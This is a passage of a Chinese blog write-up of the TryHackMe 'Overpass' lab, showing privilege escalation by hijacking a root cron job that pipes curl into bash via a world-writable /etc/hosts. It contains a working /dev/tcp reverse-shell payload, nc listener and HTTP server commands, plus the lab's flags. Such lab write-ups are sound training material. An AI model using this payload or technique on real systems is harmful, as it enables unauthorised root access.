 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu May  5 12:32:51 UTC 2022

  System load:  0.09               Processes:           92
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address <span class="token keyword">for</span> eth0: 10.10.84.23
  Swap usage:   0%

47 packages can be updated.
0 updates are security updates.

Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ <span class="token function">whoami</span><span class="token operator">&amp;&amp;</span><span class="token function">id</span>
james
uid<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span> gid<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span> groups<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span>
</code></pre>
<p>成功拿到 user 权限</p>
<pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">ls</span>
todo.txt  user.txt
james@overpass-prod:~$ <span class="token function">cat</span> user.txt
thm<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;65c1aaf000506e56996822c6281e6bf7&amp;#125;</span>
</code></pre>
<p>成功拿到 user 权限的 flag 文件</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">cat</span> todo.txt
To Do:
<span class="token operator">></span> Update Overpass<span class="token string">' Encryption, Muirland has been complaining that it'</span>s not strong enough
<span class="token operator">></span> Write down my password somewhere on a sticky note so that I don<span class="token string">'t forget it.
  Wait, we make a password manager. Why don'</span>t I just use that?
<span class="token operator">></span> Test Overpass <span class="token keyword">for</span> macOS, it builds fine but I<span class="token string">'m not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They'</span>re not updating on the website
</code></pre>
<p>这有个 todo.txt 文件作为提示，不过我英语不好，也不确定说的啥，还是先跑个 LinPeas 看看吧</p>
<pre class=" language-bash"><code class="language-bash">SHELL<span class="token operator">=</span>/bin/sh
PATH<span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.hourly
25 6    * * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="token punctuation">)</span>
47 6    * * 7   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="token punctuation">)</span>
52 6    1 * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="token punctuation">)</span>
* * * * * root curl overpass.thm/downloads/src/buildscript.sh <span class="token operator">|</span> <span class="token function">bash</span>
</code></pre>
<p>这里看到一个，root 会使用 curl 向 overpass.htm&#x2F;downloads&#x2F;src&#x2F;buildscrit.sh 请求内容，然后使用 bash 执行</p>
<pre class=" language-bash"><code class="language-bash">╔══════════╣ Hostname, hosts and DNS
overpass-prod
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal
</code></pre>
<p>然后在这里可以看到 overpass.htm 是指向的 127.0.0.1</p>
<pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">ls</span> -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
</code></pre>
<p>这里可以看到，我们是有权限修改 &#x2F;etc&#x2F;hosts 的内容的</p>
<p>那提权思路就有了</p>
<p>首先创建指定的目录和脚本</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p downloads/src <span class="token operator">&amp;&amp;</span> vim downloads/src/buildscript.sh
</code></pre>
<p>然后写入我们的 payload</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">'exec bash -i &amp;>/dev/tcp/10.18.112.117/4444 &lt;&amp;1'</span>
</code></pre>
<p>接着需要两个窗口</p>
<p>第一个窗口 使用 nc 监听一个端口</p>
<pre class=" language-bash"><code class="language-bash">nc -nvlp 4444
</code></pre>
<p>第二个窗口 使用 python3 开启一个 http 服务</p>
<pre class=" language-bash"><code class="language-bash">python3 -m http.server 80
</code></pre>
<p>然后去 shell 里修改 &#x2F;etc&#x2F;hosts 的内容</p>
<pre class=" language-bash"><code class="language-bash">10.18.112.117 overpass.thm
</code></pre>
<p>把第三行改成这样，然后等着就行了</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># python3 -m http.server 80  </span>
Serving HTTP on 0.0.0.0 port 80 <span class="token punctuation">(</span>http://0.0.0.0:80/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
10.10.84.23 - - <span class="token punctuation">[</span>05/May/2022 09:17:01<span class="token punctuation">]</span> <span class="token string">"GET /downloads/src/buildscript.sh HTTP/1.1"</span> 200 -
</code></pre>
<p>成功下载了我们的 payload</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># nc -nvlp 4444</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span>10.18.112.117<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>10.10.84.23<span class="token punctuation">]</span> 43604
bash: cannot <span class="token keyword">set</span> terminal process group <span class="token punctuation">(</span>16146<span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
root@overpass-prod:~<span class="token comment" spellcheck="true"># whoami&amp;&amp;id</span>
<span class="token function">whoami</span><span class="token operator">&amp;&amp;</span><span class="token function">id</span>                                                                                                                                    
root                                                                                                                                          
uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre>
<p>成功拿到了 root 权限</p>
<pre class=" language-bash"><code class="language-bash">root@overpass-prod:~<span class="token comment" spellcheck="true"># ls                                                                                                                      </span>
<span class="token function">ls</span>                                                                                                                                            
buildStatus                                                                                                                                   
builds                                                                                                                                        
downloads                                                                                                                                     
go                                                                                                                                            
root.txt                                                                                                                                      
src                                                                                                                                           
root@overpass-prod:~<span class="token comment" spellcheck="true"># cat root.txt                                                                                                            </span>
<span class="token function">cat</span> root.txt                                                                                                                                  
thm<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;7f336f8c359dbac18d54fdd64ea753bb&amp;#125;</span>
</code></pre>
<p>成功拿到了 root 权限的 flag 文件</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lucifiel</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://www.lucifiel.com/2022/05/05/Overpass/">http://www.lucifiel.com/2022/05/05/Overpass/</a></span>
                    </p>
                
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/TryHackMe/"># TryHackMe</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/08/04/Armageddon/">Hackthebox - Armageddon 靶场实战</a>
            
            
            <a class="next" rel="next" href="/2021/11/13/Kioptrix/">Vulnhub - Kioptrix Level 1 靶场实战</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Lucifiel | Powered by Lucifiel</span>
    </div>
</footer>
    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>